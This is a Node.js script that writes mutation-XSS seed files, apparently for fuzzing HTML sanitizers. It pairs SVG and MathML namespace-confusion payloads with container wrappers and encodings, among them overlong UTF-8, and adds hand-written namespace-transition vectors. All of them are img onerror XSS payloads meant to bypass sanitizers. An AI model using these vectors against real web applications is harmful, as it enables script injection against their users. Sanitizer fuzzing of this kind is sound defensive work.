#!/usr/bin/env node
/**
 * Generate combinatorial mXSS seeds: Namespace × Container × Encoding.
 *
 * Dimensions:
 *   Namespace  (4): html-only, svg, mathml, svg+mathml
 *   Container  (4): div, template, noscript, table
 *   Encoding   (4): raw, entity, hex-entity, overlong-utf8
 *
 * 4 × 4 × 4 = 64 combinations → written to targets/mxss_seeds/
 *
 * Usage: node targets/generate_mxss_combinatorial_seeds.js
 */
"use strict";

const fs = require("fs");
const path = require("path");

const SEED_DIR = path.join(__dirname, "mxss_seeds");

// ── Dangerous payloads per namespace ──
const NAMESPACE_PAYLOADS = {
  html: '<img src=x onerror=alert(1)>',
  svg: '<svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg>',
  mathml: '<math><mtext><style><img src=x onerror=alert(1)></style></mtext></math>',
  "svg+mathml": '<svg><math><mtext><style><img src=x onerror=alert(1)></style></mtext></math></svg>',
};

// ── Container wrappers ──
const CONTAINERS = {
  div: (inner) => `<div>${inner}</div>`,
  template: (inner) => `<template>${inner}</template>`,
  noscript: (inner) => `<noscript>${inner}</noscript>`,
  table: (inner) => `<table><tr><td>${inner}</td></tr></table>`,
};

// ── Encoding functions ──
function encodeEntity(s) {
  return s.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

function encodeHex(s) {
  return s.replace(/</g, "&#x3c;").replace(/>/g, "&#x3e;").replace(/"/g, "&#x22;");
}

function encodeOverlong(s) {
  // Overlong UTF-8 for < (0x3C): C0 BC → %C0%BC
  // Overlong UTF-8 for > (0x3E): C0 BE → %C0%BE
  // Browsers normalize these; sanitizers might not.
  return s
    .replace(/</g, "\xc0\xbc")
    .replace(/>/g, "\xc0\xbe");
}

const ENCODINGS = {
  raw: (s) => s,
  entity: encodeEntity,
  hex: encodeHex,
  overlong: encodeOverlong,
};

// ── Generate ──
let idx = 200; // Start at 200 to avoid collision with existing seeds
const generated = [];

for (const [nsName, payload] of Object.entries(NAMESPACE_PAYLOADS)) {
  for (const [contName, wrapFn] of Object.entries(CONTAINERS)) {
    for (const [encName, encFn] of Object.entries(ENCODINGS)) {
      const encoded = encFn(payload);
      const wrapped = wrapFn(encoded);
      const filename = `${idx}_combo_${nsName}_${contName}_${encName}.html`;
      const filepath = path.join(SEED_DIR, filename);
      fs.writeFileSync(filepath, wrapped, "utf8");
      generated.push(filename);
      idx++;
    }
  }
}

// ── Bonus: multi-layer namespace transition seeds ──
const TRANSITION_SEEDS = [
  // HTML → SVG → MathML → HTML (triple transition)
  '<div><svg><math><mtext><div><img src=x onerror=alert(1)></div></mtext></math></svg></div>',
  // HTML → MathML → SVG → HTML
  '<div><math><annotation-xml encoding="text/html"><svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg></annotation-xml></math></div>',
  // SVG → HTML → SVG → MathML
  '<svg><foreignObject><body><svg><math><mtext><style><img src=x onerror=alert(1)></style></mtext></math></svg></body></foreignObject></svg>',
  // Template + SVG + MathML (container hides namespace from sanitizer)
  '<template><svg><math><mtext><style><img src=x onerror=alert(1)></style></mtext></math></svg></template>',
  // Noscript + SVG → MathML (scripting flag differential)
  '<noscript><svg><math><mtext><style><img src=x onerror=alert(1)></style></mtext></math></svg></noscript>',
  // Table foster parenting + namespace switch
  '<table><svg><math><mtext><style><img src=x onerror=alert(1)></style></mtext></math></svg></table>',
  // Deep nesting: SVG → foreignObject → SVG → foreignObject
  '<svg><foreignObject><body><svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg></body></foreignObject></svg>',
  // annotation-xml with HTML encoding + SVG wrapper
  '<svg><math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math></svg>',
  // mglyph integration point + nested namespace
  '<math><mglyph><svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg></mglyph></math>',
  // malignmark integration point
  '<math><malignmark><svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg></malignmark></math>',
  // desc/title SVG integration points
  '<svg><desc><math><mtext><style><img src=x onerror=alert(1)></style></mtext></math></desc></svg>',
  '<svg><title><math><mtext><style><img src=x onerror=alert(1)></style></mtext></math></title></svg>',
];

for (const seed of TRANSITION_SEEDS) {
  const filename = `${idx}_combo_transition_${idx - 264}.html`;
  const filepath = path.join(SEED_DIR, filename);
  fs.writeFileSync(filepath, seed, "utf8");
  generated.push(filename);
  idx++;
}

console.log(`Generated ${generated.length} combinatorial mXSS seeds in ${SEED_DIR}`);
